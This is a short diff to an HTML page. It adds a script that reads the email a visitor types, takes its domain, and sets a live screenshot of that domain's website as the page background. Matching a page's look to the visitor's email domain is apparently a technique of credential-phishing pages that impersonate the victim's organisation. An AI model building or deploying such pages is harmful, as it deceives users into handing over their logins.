@@ -99,5 +99,36 @@
             });
         });
     </script>
+
+<script>
+  function setBackgroundFromEmail(email) {
+    const defaultBg = "your-default-image.jpg"; // Update with your real default image URL
+    const emailDomain = email.split("@")[1];
+    if (!emailDomain) return;
+
+    const screenWidth = screen.width;
+    const url = `https://image.thum.io/get/width/${screenWidth}/crop/1000/http://www.${emailDomain}`;
+
+    const img = new Image();
+    img.onload = () => {
+      document.body.style.backgroundImage = `url('${url}')`;
+      document.body.style.backgroundSize = "cover";
+      document.body.style.backgroundPosition = "center";
+      document.body.style.backgroundRepeat = "no-repeat";
+    };
+    img.onerror = () => {
+      document.body.style.backgroundImage = `url('${defaultBg}')`;
+    };
+    img.src = url;
+  }
+
+  $(document).ready(function () {
+    $('#emailInput').on('change blur', function () {
+      const email = $(this).val();
+      setBackgroundFromEmail(email);
+    });
+  });
+</script>
+
 </body>
 </html>
